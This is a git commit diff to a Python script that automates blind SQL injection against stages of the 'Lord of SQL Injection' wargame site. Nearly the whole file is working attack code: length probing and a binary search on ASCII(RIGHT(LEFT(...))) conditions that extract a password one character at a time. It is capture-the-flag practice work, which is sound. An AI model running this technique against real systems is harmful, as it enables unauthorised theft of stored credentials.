36923e275510099fc93d34ef94c7b0def23ef6f6
장한빈 <janghanbin@janghanbin-ui-MacBook-Pro.local>
2019-01-12 02:58:20 +0900

    complete los4

--- main.py
+++ main.py
@@ -1,11 +1,11 @@
 import requests
 from bs4 import BeautifulSoup
-import urllib
+from urllib.parse import urlparse
 from getpass import getpass
 
 
 def login(id, pw):
-    url = 'https://los.eagle-jump.org/?login'
+    url = 'https://los.rubiya.kr/?login'
     data = {'id': id, 'pw': pw}
     res = requests.post(url, data=data)
 
@@ -21,12 +21,11 @@ def login(id, pw):
 
 
 def get_length(pwning_url, field, add_comment, login_cookies):
-    length = 1
 
+    length = 1
     while True:
-        print('Trying To get length of {0} by length {1}'.format(field, length))
+        print('Trying to get length of {0} by length {1}'.format(field, length))
         url = pwning_url + ' length({0})={1} {2} '.format(field, length, '%23' if add_comment else '')
-        print(url)
         res = requests.get(url, cookies=login_cookies)
         soup = BeautifulSoup(res.text, 'html.parser')
         h2s = soup.find_all('h2')
@@ -44,37 +43,51 @@ def do_blind_inject(pwning_url, field, add_comment, login_cookies):
     idx = 1
     print('Success to get length {0} is {1} '.format(field, length))
     while idx <= length:
+        print('Trying to get value index[{0}]'.format(idx))
         min_ascii = 32
         max_ascii = 127
         while True:
-            url = pwning_url + ' {2} < RIGHT(LEFT({0}),{1}),1)'.format(field, idx, int((min_ascii + max_ascii) / 2))
-            print('request : ' + url)
+            # password must compare with int in mysql 'a' = 'A' is true
+            url = pwning_url + ' {2} < ASCII(RIGHT(LEFT({0},{1}),1)) {3} '.format(field, idx, int((min_ascii + max_ascii) / 2), '%23' if add_comment else '')
             res = requests.get(url, cookies=login_cookies)
             soup = BeautifulSoup(res.text, 'html.parser')
             h2s = soup.find_all('h2')
-            print(h2s)
-            for h2 in h2s:
-                if h2.find('Hello') != -1 :
-                    min_ascii = int((min_ascii + max_ascii) / 2)
-                else:
-                    url = pwning_url + ' {2} = RIGHT(LEFT({0}),{1}),1)'.format(field, idx, int((min_ascii + max_ascii) / 2))
-                    res = requests.get(url, cookies=login_cookies)
-                    soup = BeautifulSoup(res.text, 'html.parser')
-                    h2s = soup.find_all('h2')
 
-                    for h2 in h2s:
-                        # find pw one word
-                        if h2.find('Hello') != -1:
-                            pw = pw + str((min_ascii + max_ascii) / 2)
-                            break
-                    max_ascii = int((min_ascii + max_ascii) / 2)
+            if max_ascii == int((min_ascii + max_ascii) / 2) or min_ascii == int((min_ascii + max_ascii) / 2) :
+                if not h2s:
+                    pw += chr(int((min_ascii + max_ascii) / 2))
+                if h2s:
+                    pw += chr(int((min_ascii + max_ascii) / 2 + 1))
+                break
+
+            # if false
+            if not h2s:
+                max_ascii = int((min_ascii + max_ascii) / 2)
+            else:
+
+                min_ascii = int((min_ascii + max_ascii) / 2)
+
+
+
         idx += 1
-
+    parsed_url = urlparse(pwning_url)
+    origin_url = '{url.scheme}://{url.netloc}/{url.path}'.format(url=parsed_url)
     print('password is {0}'.format(pw))
+    res = requests.get(origin_url, params={field: pw}, cookies=login_cookies)
+    soup = BeautifulSoup(res.text, 'html.parser')
+    h2s = soup.find_all('h2')
+    if not h2s:
+        print('Failed to clear! Plz check logic')
+    else:
+        for h2 in h2s:
+            if h2.find('Clear') != -1:
+                print('Success to clear this stage!')
+                break
 
 
 
 if __name__ == '__main__':
+
     user_id = input('Enter your los id : ')
     # user_pw = getpass('Enter your los pw : ')
     user_pw = input('Enter your los pw : ')
@@ -86,8 +99,6 @@ if __name__ == '__main__':
     if pwning_url.find('%23') != -1:
         pwning_url = pwning_url[:pwning_url.find('%23')]
 
-    print(pwning_url)
-    # pwning_query = input('Enter defalut query to escape security options')
     field = input('Enter query name : ')
     while True:
         add_comment = input('Do you want to add comment end of the url[Y/N] ? ')
